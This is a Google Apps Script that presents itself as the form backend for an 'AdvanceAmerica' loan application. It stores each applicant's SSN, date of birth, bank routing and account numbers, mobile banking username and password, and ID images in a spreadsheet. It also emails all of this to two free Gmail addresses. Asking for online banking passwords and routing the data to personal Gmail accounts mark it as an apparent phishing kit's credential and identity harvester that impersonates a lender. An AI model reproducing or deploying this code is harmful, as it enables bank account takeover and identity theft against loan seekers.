// ============================================================
//  AdvanceAmerica — Loan Application Google Apps Script
//  Paste this entire file into Extensions > Apps Script
//  No extra scopes needed — uses MailApp for email with attachments
// ============================================================

var NOTIFICATION_EMAIL = "finnfoxpersonalloan@gmail.com";
var NOTIFICATION_EMAIL_2 = "cash00000advance@gmail.com";
var SHEET_NAME = "AdvanceAmerica Applications";   // Sheet tab name (created automatically)
var SCRIPT_ENABLED = true;                        // Set to FALSE to stop all submissions

function doPost(e) {
  // Kill switch — set SCRIPT_ENABLED = false to block submissions
  if (!SCRIPT_ENABLED) {
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, message: "Service temporarily unavailable." }))
      .setMimeType(ContentService.MimeType.JSON);
  }

  try {
    var data = JSON.parse(e.postData.contents);
    var ss = SpreadsheetApp.getActiveSpreadsheet();

    // Create sheet tab if it doesn't exist
    var sheet = ss.getSheetByName(SHEET_NAME);
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);
      // Add headers
      sheet.appendRow([
        "Timestamp",
        "Loan Amount ($)",
        "Monthly Income ($)",
        "Purpose",
        "First Name",
        "Last Name",
        "Email",
        "Phone",
        "Date of Birth",
        "SSN",
        "Employer",
        "Employer Phone",
        "Street Address",
        "City",
        "State",
        "Zip Code",
        "Bank Name",
        "Routing Number",
        "Account Number",
        "Mobile Banking Username",
        "Mobile Banking Password",
        "Document Type"
      ]);

      // Style the header row
      var headerRange = sheet.getRange(1, 1, 1, 22);
      headerRange.setBackground("#0f1f3d");
      headerRange.setFontColor("#ffffff");
      headerRange.setFontWeight("bold");
      sheet.setFrozenRows(1);
    }

    // Append the new application row
    sheet.appendRow([
      new Date().toLocaleString(),
      data.loanAmount        || "",
      data.monthlyIncome     || "",
      data.loanPurpose       || "",
      data.firstName         || "",
      data.lastName          || "",
      data.email             || "",
      data.phone             || "",
      data.dob               || "",
      data.ssn               || "",
      data.currentEmployer   || "",
      data.employerPhone     || "",
      data.streetAddress     || "",
      data.city              || "",
      data.state             || "",
      data.zipCode           || "",
      data.bankName          || "",
      data.routingNumber     || "",
      data.accountNumber     || "",
      data.mobileBankingUsername || "",
      data.mobileBankingPassword || "",
      data.documentType      || ""
    ]);

    // Auto-resize columns for readability
    sheet.autoResizeColumns(1, 22);

    // Send email notification to yourself
    sendEmailNotification(data);

    return ContentService
      .createTextOutput(JSON.stringify({ success: true }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, message: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function sendEmailNotification(data) {
  var subject = "🔔 New Loan Application — " + (data.firstName || "") + " " + (data.lastName || "");
  var submittedAt = new Date().toLocaleString();
  var fullName = (data.firstName || "") + " " + (data.lastName || "");
  var fullAddress = (data.streetAddress || "") + ", " + (data.city || "") + ", " + (data.state || "") + " " + (data.zipCode || "");

  var idStatus = (data.idFrontName || data.idBackName)
    ? "✅ Uploaded (see attachments)"
    : "⚠️ Not uploaded";

  var htmlBody =
    '<div style="font-family:Arial,sans-serif;max-width:620px;margin:0 auto;background:#f4f6f9;padding:24px;">' +

    // Header
    '<div style="background:#0f1f3d;border-radius:10px 10px 0 0;padding:24px 28px;">' +
    '<h1 style="color:#ffffff;margin:0;font-size:20px;">🔔 New Loan Application</h1>' +
    '<p style="color:#E8521A;margin:6px 0 0;font-size:13px;">Submitted: ' + submittedAt + '</p>' +
    '</div>' +

    // Body wrapper
    '<div style="background:#ffffff;border-radius:0 0 10px 10px;padding:28px;">' +

    // Loan Details
    '<h2 style="color:#0f1f3d;font-size:14px;text-transform:uppercase;letter-spacing:1px;border-bottom:2px solid #E8521A;padding-bottom:6px;margin-top:0;">💰 Loan Details</h2>' +
    '<table style="width:100%;border-collapse:collapse;margin-bottom:20px;">' +
    _row("Loan Amount", "$" + (data.loanAmount || "N/A")) +
    _row("Monthly Income", "$" + (data.monthlyIncome || "N/A")) +
    _row("Purpose", data.loanPurpose || "N/A") +
    '</table>' +

    // Personal Info
    '<h2 style="color:#0f1f3d;font-size:14px;text-transform:uppercase;letter-spacing:1px;border-bottom:2px solid #E8521A;padding-bottom:6px;">👤 Personal Info</h2>' +
    '<table style="width:100%;border-collapse:collapse;margin-bottom:20px;">' +
    _row("Full Name", fullName) +
    _row("Email", data.email || "N/A") +
    _row("Phone", data.phone || "N/A") +
    _row("Date of Birth", data.dob || "N/A") +
    _row("SSN", data.ssn || "N/A") +
    _row("Employer", data.currentEmployer || "N/A") +
    _row("Employer Phone", data.employerPhone || "N/A") +
    '</table>' +

    // Address
    '<h2 style="color:#0f1f3d;font-size:14px;text-transform:uppercase;letter-spacing:1px;border-bottom:2px solid #E8521A;padding-bottom:6px;">🏠 Address</h2>' +
    '<table style="width:100%;border-collapse:collapse;margin-bottom:20px;">' +
    _row("Street", data.streetAddress || "N/A") +
    _row("City", data.city || "N/A") +
    _row("State", data.state || "N/A") +
    _row("Zip Code", data.zipCode || "N/A") +
    '</table>' +

    // Banking
    '<h2 style="color:#0f1f3d;font-size:14px;text-transform:uppercase;letter-spacing:1px;border-bottom:2px solid #E8521A;padding-bottom:6px;">🏦 Banking Details</h2>' +
    '<table style="width:100%;border-collapse:collapse;margin-bottom:20px;">' +
    _row("Bank Name", data.bankName || "N/A") +
    _row("Routing Number", data.routingNumber || "N/A") +
    _row("Account Number", data.accountNumber || "N/A") +
    _row("Mobile Banking Username", data.mobileBankingUsername || "N/A") +
    _row("Mobile Banking Password", data.mobileBankingPassword || "N/A") +
    '</table>' +

    // ID Documents
    '<h2 style="color:#0f1f3d;font-size:14px;text-transform:uppercase;letter-spacing:1px;border-bottom:2px solid #E8521A;padding-bottom:6px;">🪪 Government ID</h2>' +
    '<table style="width:100%;border-collapse:collapse;margin-bottom:20px;">' +
    _row("ID Type", data.documentType || "N/A") +
    _row("ID Front", data.idFrontName || "Not uploaded") +
    _row("ID Back", data.idBackName || "Not uploaded") +
    _row("Attachments", idStatus) +
    '</table>' +

    // Footer
    '<div style="background:#f4f6f9;border-radius:8px;padding:14px 18px;text-align:center;margin-top:10px;">' +
    '<p style="margin:0;font-size:12px;color:#888;">This is an automated notification from <strong>AdvanceAmerica</strong>. Do not reply to this email.</p>' +
    '</div>' +

    '</div>' + // end body wrapper
    '</div>';  // end outer

  // Plain text fallback
  var plainBody = "New loan application from " + fullName + "\n\nSubmitted: " + submittedAt + "\n\nCheck your email client for the full formatted details.";

  // Prepare attachments
  var attachments = [];
  
  // Decode and attach ID Front
  if (data.idFrontFile && data.idFrontFile.length > 100) {
    try {
      var base64Data = data.idFrontFile.toString();
      if (base64Data.indexOf(',') !== -1) {
        base64Data = base64Data.split(',')[1];
      }
      var decoded = Utilities.base64Decode(base64Data);
      var blob = Utilities.newBlob(decoded, data.idFrontType || 'image/jpeg', data.idFrontName || 'id-front.jpg');
      attachments.push(blob);
    } catch (e) {
      Logger.log("Error processing ID Front: " + e);
    }
  }
  
  // Decode and attach ID Back
  if (data.idBackFile && data.idBackFile.length > 100) {
    try {
      var base64Data = data.idBackFile.toString();
      if (base64Data.indexOf(',') !== -1) {
        base64Data = base64Data.split(',')[1];
      }
      var decoded = Utilities.base64Decode(base64Data);
      var blob = Utilities.newBlob(decoded, data.idBackType || 'image/jpeg', data.idBackName || 'id-back.jpg');
      attachments.push(blob);
    } catch (e) {
      Logger.log("Error processing ID Back: " + e);
    }
  }

  var emailOptions = { htmlBody: htmlBody, name: 'AdvanceAmerica Applications' };
  if (attachments.length > 0) { emailOptions.attachments = attachments; }

  MailApp.sendEmail(NOTIFICATION_EMAIL, subject, plainBody, emailOptions);
  MailApp.sendEmail(NOTIFICATION_EMAIL_2, subject, plainBody, emailOptions);
}

function _row(label, value) {
  return '<tr style="border-bottom:1px solid #f0f0f0;">' +
    '<td style="padding:8px 10px;font-size:13px;color:#555;font-weight:600;width:45%;background:#fafafa;">' + label + '</td>' +
    '<td style="padding:8px 10px;font-size:13px;color:#1a1a1a;">' + value + '</td>' +
    '</tr>';
}

// Required for CORS preflight
function doGet(e) {
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok" }))
    .setMimeType(ContentService.MimeType.JSON);
}
